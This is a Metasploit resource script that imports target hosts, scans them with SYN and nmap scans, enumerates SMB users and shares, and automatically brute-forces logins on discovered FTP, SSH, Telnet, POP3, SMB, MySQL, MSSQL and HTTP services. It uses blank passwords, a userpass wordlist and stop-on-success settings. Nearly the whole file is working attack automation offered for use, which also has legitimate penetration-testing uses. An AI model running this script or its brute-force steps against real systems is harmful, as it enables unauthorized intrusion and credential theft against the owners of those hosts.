<ruby>
   help = %Q|
    Description:
       This Metasploit RC file can be used to manage msfconsole database tasks:
       Display database data, record msfconsole activity, add hosts to database,
       import files.xml import list of hosts inside a text file (one-per-line-entries)
       auto-brute-force db hosts by service name, auto-search compatible auxiliarys modules
       based on db hosts service name inputed and clean all database data at script exit.

    Execute in msfconsole:
       setg CLEAN <true-or-blank>
       setg DB_AUX <true-or-blank>
       setg RECORD <true-or-blank>
       setg DB_SCAN <true-or-blank>
       setg DB_BRUTE <service-name>
       setg CSV_EXPORT <service-name>
       setg XML_EXPORT <true-or-blank>
       setg DBHOST <asign-RHOSTS-to-msfconsole>
       setg RUN_RC <absoluct-path-of-rc-to-execute>
       setg XML_IMPORT <absoluct-path-of-file.xml-to-import>
       setg TXT_IMPORT <absoluct-path-of-hosts-list.txt-to-import>
       resource <path-to-script>/manage_db.rc

    Author:
       r00t-3xp10it  <pedroubuntu10[at]gmail.com>
    |
    print_line(help)
    Rex::sleep(2.0)
    print_line("")


    if (framework.datastore['RECORD'] == "true")
       run_single("spool database.log")
       Rex::sleep(1.0)
    end

    unless (framework.datastore['DBHOST'] == nil or framework.datastore['DBHOST'] == '')
       run_single("hosts -a #{framework.datastore['DBHOST']}")
       Rex::sleep(1.0)
    end

    unless (framework.datastore['TXT_IMPORT'] == nil or framework.datastore['TXT_IMPORT'] == '')
       check_import = "#{framework.datastore['TXT_IMPORT']}"
       unless (File.exist?(check_import))
          print_error("[ERROR] File to be imported not found.")
          print_error("[ERROR] #{check_import}")
          return nil
       end
       import_txt = File.read(check_import)
          parse_data = import_txt.split(' ').join(' ')
          print_line("List of hosts to import")
          print_line("=======================")
          run_single("hosts -a #{parse_data}")
          Rex::sleep(1.5)
          print_status("Scanning new targets (syn scan)")
          Rex::sleep(1.0)
          run_single("use auxiliary/scanner/portscan/syn")
          run_single("set VERBOSE true")
          run_single("set THREADS 16")
          run_single("set PORTS 21-23,53,80,110,139,443,445,1433,3306,8080-8083")
          run_single("hosts -R")
          run_single("exploit")
          Rex::sleep(2.5)
    end

    unless (framework.datastore['XML_IMPORT'] == nil or framework.datastore['XML_IMPORT'] == '')
       xml_file = "#{framework.datastore['XML_IMPORT']}"
       print_status("Import xml: #{xml_file}")
       unless (File.exist?(xml_file))
          print_error("[ERROR] Script can not find the path inputed.")
          print_error("[ERROR] #{xml_file}")
          return nil
       end
       run_single("db_import #{framework.datastore['XML_IMPORT']}")
       Rex::sleep(1.0)
    end


    run_single("workspace -v")
    Rex::sleep(0.5)
    xhost = framework.db.hosts.map(&:address).join(' ')
    xport = framework.db.services.map(&:port).join(' ')
    proto = framework.db.services.map(&:name).join(' ')
    unless xhost.nil? or xhost == '' or xhost == ' '
       run_single("hosts -c address,name,os_name,os_flavor,os_sp,purpose")
       print_line("")
       Rex::sleep(0.5)
       run_single("services -c port,proto,name,state -u")
       Rex::sleep(2.0)
    end
    print_line("")


    if (framework.datastore['DB_SCAN'] == "true")
       print_warning("Scanning database hosts with nmap.")
       unless xhost.nil? or xhost == '' or xhost == ' '
          print_status("RHOSTS: #{xhost}")
          run_single("db_nmap -sV -Pn -T4 -O --open #{xhost}")
          print_line("")
          run_single("hosts -c address,name,os_name,purpose")
          print_line("")
          run_single("services -c port,proto,name,state -u")
          print_line("")
          Rex::sleep(1.0)
       else
          print_error("[ERROR] None hosts found in current database.")
          Rex::sleep(2.0)
          print_line("")
          run_single("workspace -v")
          print_line("")
          run_single("unsetg all")
          return nil
       end
    end

    if (framework.datastore['DB_AUX'] == "true")
    print_line("   Sellect auxiliary modules based on db service names:")
    print_line("   ----------------------------------------------------")
    Rex::sleep(1.5)
       unless proto =~ /ftp/i or proto =~ /ssh/i or proto =~ /telnet/i or proto =~ /smb/i or proto =~ /microsoft-ds/i or proto =~ /netbios-ssn/i or proto =~ /msrcp/i or proto =~ /pop3/i or proto =~ /mssql/i or proto =~ /mysql/i or proto =~ /http/i or proto =~ /smtp/i or proto =~ /imap/i
          print_error("[ERROR] None service names found in current database.")
          Rex::sleep(2.0)
          run_single("unsetg all")
          return nil
       end
       if proto =~ /ftp/i
          run_single("grep -m 5 scanner search name:ftp type:auxiliary")
       end
       if proto =~ /ssh/i
            run_single("grep -m 5 scanner search name:ssh type:auxiliary")
       end
       if proto =~ /telnet/i
            run_single("grep -m 5 scanner search name:telnet type:auxiliary")
       end
       if proto =~ /smb/i or proto =~ /microsoft-ds/i or proto =~ /netbios-ssn/i or proto =~ /msrpc/i
            run_single("grep -m 5 scanner search name:smb type:auxiliary")
       end
       if proto =~ /pop3/i
            run_single("grep -m 5 scanner search name:pop3 type:auxiliary")
       end
       if proto =~ /ms-sql-s/i or proto =~ /mssql/i or proto =~ /mssql-m/i
            run_single("grep -m 5 scanner search name:mssql type:auxiliary")
       end
       if proto =~ /mysql/i
            run_single("grep -m 5 scanner search name:mysql type:auxiliary")
       end
       if proto =~ /http/i
            run_single("grep -m 5 scanner search name:http type:auxiliary")
       end
       if proto =~ /smtp/i
            run_single("grep -m 5 scanner search name:smtp type:auxiliary")
       end
       if proto =~ /imap/i
            run_single("grep -m 5 scanner search name:imap type:auxiliary")
       end
    print_line("   ----------------------------------------------------")
    print_line("")
    end


    unless (framework.datastore['DB_BRUTE'] == nil or framework.datastore['DB_BRUTE'] == '')
       xport = framework.db.services.map(&:port).join(' ')
       proto = framework.db.services.map(&:name).join(' ')
       unless proto =~ /#{framework.datastore['DB_BRUTE']}/i
            print_error("[ERROR] Service [#{framework.datastore['DB_BRUTE']}] not found in database.")
            Rex::sleep(2.5)
            run_single("unsetg all")
            return nil
       end

       unless (framework.datastore['DB_BRUTE'] == "ftp" or framework.datastore['DB_BRUTE'] == "ssh" or framework.datastore['DB_BRUTE'] == "telnet" or framework.datastore['DB_BRUTE'] == "smb" or framework.datastore['DB_BRUTE'] == "microsoft-ds" or framework.datastore['DB_BRUTE'] == "netbios-ssn" or framework.datastore['DB_BRUTE'] == "msrpc" or framework.datastore['DB_BRUTE'] == "pop3" or framework.datastore['DB_BRUTE'] == "mssql" or framework.datastore['DB_BRUTE'] == "mysql" or framework.datastore['DB_BRUTE'] == "http")
          print_error("[ERROR] This option does not accept [#{framework.datastore['DB_BRUTE']}] service names.")
          print_warning("Service names supported: ftp|ssh|telnet|smb|microsoft-ds|netbios-ssn|msrpc|pop3|mssql|ms-sql-s|mssql-m|mysql|http")
          Rex::sleep(2.0)
          run_single("unsetg all")
          return nil
       end

       run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
         if xport =~ /21/i or proto =~ /ftp/i
           if (framework.datastore['DB_BRUTE'] == "ftp")
              print_warning("Remote Target port: 21 ftp found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ftp/ftp_version")
              run_single("set FTPPASS ReadTeam")
              run_single("set THREADS 16")
              run_single("services -c name -S ftp -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/anonymous")
              run_single("set FTPPASS ReadTeam")
              run_single("set THREADS 16")
              run_single("services -c name -S ftp -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/ftp_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("set THREADS 16")
              run_single("services -c name -S ftp -u -R")
              run_single("exploit")
           end
         end

         if xport =~ /22/i or proto =~ /ssh/i
           if (framework.datastore['DB_BRUTE'] == "ssh")
              print_warning("Remote Target port: 22 ssh found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ssh/ssh_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 13")
              run_single("services -c name -S ssh -u -R")
              run_single("exploit")
           end
         end

         if xport =~ /23/i or proto =~ /telnet/i
           if (framework.datastore['DB_BRUTE'] == "telnet")
              print_warning("Remote Target port: 23 telnet found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/telnet/telnet_version")
              run_single("services -c name -S telnet -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/telnet/telnet_login")
              run_single("set BLANK_PASSWORDS true")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("services -c name -S telnet -R")
              run_single("exploit")
           end
         end

         if xport =~ /110/i or proto =~ /pop3/i
           if (framework.datastore['DB_BRUTE'] == "pop3")
              print_warning("Remote Target port: 110 pop3 found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/pop3/pop3_version")
              run_single("set THREADS 20")
              run_single("services -c name -S pop3 -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/pop3/pop3_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("set BLANK_PASSWORDS true")
              run_single("unset USER_FILE")
              run_single("unset PASS_FILE")
              run_single("set THREADS 10")
              run_single("services -c name -S pop3 -u -R")
              run_single("exploit")
           end
         end

         if xport =~ /445/i or proto =~ /smb/i or proto =~ /microsoft-ds/i or proto =~ /netbios-ssn/i or proto =~ /msrpc/i
           if (framework.datastore['DB_BRUTE'] == "smb")
              print_warning("Remote Target port: 445 smb found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/smb/smb_version")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_lookupsid")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumusers")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumshares")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BLANK_PASSWORDS true")
              run_single("unset USER_FILE")
              run_single("unset PASS_FILE")
              run_single("set THREADS 10")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
           end
         end

         if xport =~ /3306/i or proto =~ /mysql/i
           if (framework.datastore['DB_BRUTE'] == "mysql")
              print_warning("Remote Target port 3306 mysql found.")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mysql/mysql_version")
              run_single("set THREADS 16")
              run_single("services -c name -S mysql -u -R")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/scanner/mysql/mysql_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BLANK_PASSWORDS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 25")
              run_single("services -c name -S mysql -u -R")
              run_single("exploit")
              Rex::sleep(1.5)
           end
         end

         if xport =~ /1433/i or proto =~ /ms-sql-s/i or proto =~ /mssql/i or proto =~ /mssql-m/i
           if (framework.datastore['DB_BRUTE'] == "mssql")
              print_warning("Remote Target port 1433 mssql found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mssql/mssql_ping")
              run_single("set THREADS 5")
              run_single("services -c name -S mssql -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/mssql/mssql_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BLANK_PASSWORDS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 16")
              run_single("services -c name -S mssql -R")
              run_single("exploit")
           end
         end

         if xport =~ /80/i or proto =~ /http/i
           if (framework.datastore['DB_BRUTE'] == "http")
              print_warning("Remote Target port: 80 http found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/http/title")
              run_single("set THREADS 16")
              run_single("services -c name -S http -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/options")
              run_single("set THREADS 8")
              run_single("services -c name -S http -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/dir_scanner")
              run_single("set THREADS 30")
              run_single("services -c name -S http -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/http_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BLANK_PASSWORDS true")
              run_single("unset USER_FILE")
              run_single("unset PASS_FILE")
              run_single("set VERBOSE true")
              run_single("set THREADS 32")
              run_single("services -c name -S http -u -R")
              run_single("exploit")
           end
         end
    end

    unless (framework.datastore['CSV_EXPORT'] == nil or framework.datastore['CSV_EXPORT'] == '')
       xport = framework.db.services.map(&:port).join(' ')
       proto = framework.db.services.map(&:name).join(' ')
       unless proto =~ /#{framework.datastore['CSV_EXPORT']}/i
            print_error("[ERROR] Service [#{framework.datastore['CSV_EXPORT']}] not found in database.")
            Rex::sleep(2.5)
            run_single("unsetg all")
            return nil
       end
       print_warning("Exporting hosts with service #{framework.datastore['CSV_EXPORT']}")
       print_line("")
       run_single("services -c port,proto,name -S #{framework.datastore['CSV_EXPORT']}")
       print_line("")
       Rex::sleep(1.0)
       run_single("services -c port,name -S #{framework.datastore['CSV_EXPORT']} -o #{framework.datastore['CSV_EXPORT']}_hosts.CSV")
    end

    unless (framework.datastore['RUN_RC'] == nil or framework.datastore['RUN_RC'] == '')
       exec_rc = "#{framework.datastore['RUN_RC']}"
       unless (File.exist?(exec_rc))
          print_error("[ERROR] resource script to execute not found.")
          print_warning("[ERROR] #{exec_rc}")
          run_single("unsetg all")
          return nil
       end
       run_single("resource #{exec_rc}")
    end

    if (framework.datastore['XML_EXPORT'] == "true")
       print_warning("Exporting database to: database.xml")
       Rex::sleep(1.5)
       run_single("db_export -f xml database.xml")
    end

    print_warning("Cleaning global variables.")
    Rex::sleep(1.5)
    if (framework.datastore['CLEAN'] == "true")
       run_single("unsetg all")
       run_single("unset all")
       print_warning("Cleaning current database.")
       Rex::sleep(1.5)
       run_single("hosts -d")
       run_single("services -d")
       print_line("")
    else
       run_single("unsetg all")
       run_single("unset all")
       print_line("")
    end

    print_line("")
    print_line("Resource Commands              Description")
    print_line("-----------------              -----------")
    print_line("setg CLEAN true                Clean database at exit")
    print_line("setg RECORD true               Record msfconsole activity")
    print_line("setg DBHOST 10.10.10.3         Asign RHOSTS manually to database")
    print_line("setg DB_SCAN true              Auto-Scan database hosts with nmap")
    print_line("setg XML_IMPORT /root/dic.xml  Import database.xml file to database")
    print_line("setg TXT_IMPORT /root/dic.txt  Import text hosts list (one-per-line)")
    print_line("setg XML_EXPORT true           Export contents of db to database.xml")
    print_line("setg CSV_EXPORT http           Export list of hosts based in service name")
    print_line("setg DB_BRUTE smb              Auto-Exploit db hosts based on service name")
    print_line("setg DB_AUX true               Auto-search auxiliarys based on db service names")
    print_line("setg RUN_RC /root/script.rc    Execute script.rc before manage_db.rc ends execution")
    print_line("resource /root/manage_db.rc    Execute this resource script")
    print_line("")
    run_single("back")

</ruby>
